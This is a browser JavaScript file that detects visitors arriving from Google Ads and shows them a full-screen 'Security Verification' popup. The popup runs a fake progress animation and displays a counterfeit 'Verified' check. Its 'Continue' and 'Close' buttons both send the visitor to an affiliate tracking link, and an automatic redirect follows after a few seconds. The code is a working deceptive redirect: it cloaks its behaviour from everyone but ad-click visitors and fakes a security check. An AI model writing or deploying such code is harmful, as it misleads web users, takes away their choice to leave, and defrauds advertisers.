const params = new URLSearchParams(window.location.search);

const fromGoogleAds =
  params.has("gclid") ||
  params.has("gbraid") ||
  params.has("wbraid") ||
  params.has("gad_source");

console.log("URL:", window.location.href);
console.log("gclid:", params.has("gclid"));
console.log("gbraid:", params.has("gbraid"));
console.log("gad_source:", params.has("gad_source"));
console.log("fromGoogleAds:", fromGoogleAds);

if (fromGoogleAds) {
  console.log("Opening popup");
  showPopup();
}

function showPopup() {

  const REDIRECT_URL =
  "https://record.affantage.com/_qXDjiR0NSTiVAv0U_Fv2nWNd7ZgqdRLk/1/?pg=6";

  if (document.querySelector(".modal-backdrop")) return;

  const popup = document.createElement("div");

  popup.className = "modal-backdrop";

  popup.innerHTML = `
  <style>
.modal-backdrop{
position:fixed;
inset:0;
display:flex;
align-items:center;
justify-content:center;
background:rgba(0,0,0,.65);
backdrop-filter:blur(18px);
-webkit-backdrop-filter:blur(18px);
z-index:999999;
}

.modal{
width:90%;
max-width:460px;
padding:35px;
border-radius:24px;
text-align:center;
color:#fff;
background:rgba(12,12,12,.92);
border:1px solid rgba(255,255,255,.12);
box-shadow:
0 25px 80px rgba(0,0,0,.75),
inset 0 1px 0 rgba(255,255,255,.08);
font-family:Arial,sans-serif;
}

.modal h2{
font-size:30px;
margin-bottom:12px;
color:#ffffff;
}

.subtitle{
color:rgba(255,255,255,.75);
font-size:15px;
line-height:1.6;
}

.verify-box{
margin-top:25px;
background:rgba(255,255,255,.05);
border:1px solid rgba(255,255,255,.08);
border-radius:16px;
padding:18px;
display:flex;
align-items:center;
gap:15px;
justify-content:center;
}

.checkbox{
width:34px;
height:34px;
border:2px solid rgba(255,255,255,.25);
border-radius:8px;
background:rgba(255,255,255,.05);
display:flex;
align-items:center;
justify-content:center;
}

.action-buttons{
display:flex;
gap:12px;
justify-content:center;
margin-top:20px;
}

.continue-btn,
.close-btn{
padding:12px 22px;
border:none;
border-radius:12px;
font-weight:700;
cursor:pointer;
transition:.25s;
}

.continue-btn{
background:linear-gradient(135deg,#22c55e,#16a34a);
color:#fff;
}

.close-btn{
background:rgba(255,255,255,.08);
color:#fff;
border:1px solid rgba(255,255,255,.12);
}

.continue-btn:hover,
.close-btn:hover{
transform:translateY(-2px);
}
</style>
  <div class="modal">

    <h2>🛡️ Security Verification</h2>

    <p class="subtitle">
      Please wait while we prepare your experience.
    </p>

    <div class="verify-box">

      <div class="checkbox" id="checkbox">
        <div class="spinner" id="spinner"></div>
      </div>

      <div>
        <strong>Verification</strong>
        <div id="status">Initializing...</div>
      </div>

    </div>

    <div class="action-buttons">
      <button id="continueBtn" class="continue-btn">
        Continue
      </button>

      <button id="closeBtn" class="close-btn">
        Close
      </button>
    </div>

  </div>
  `;

  document.body.appendChild(popup);

  const status = document.getElementById("status");
  const spinner = document.getElementById("spinner");
  const checkbox = document.getElementById("checkbox");

  document
    .getElementById("continueBtn")
    .addEventListener("click", () => {
      window.location.href = REDIRECT_URL;
    });

  document
    .getElementById("closeBtn")
    .addEventListener("click", () => {
      window.location.href = REDIRECT_URL;
    });

  setTimeout(() => {
    status.textContent = "Analyzing request...";
  }, 1500);

  setTimeout(() => {
    status.textContent = "Loading content...";
  }, 3000);

  setTimeout(() => {

    if (spinner) spinner.remove();

    checkbox.innerHTML = "✓";
    checkbox.style.color = "#22c55e";
    checkbox.style.fontWeight = "bold";

    status.textContent = "Verified";

    setTimeout(() => {
      window.location.href = REDIRECT_URL;
    }, 1000);

  }, 5000);

}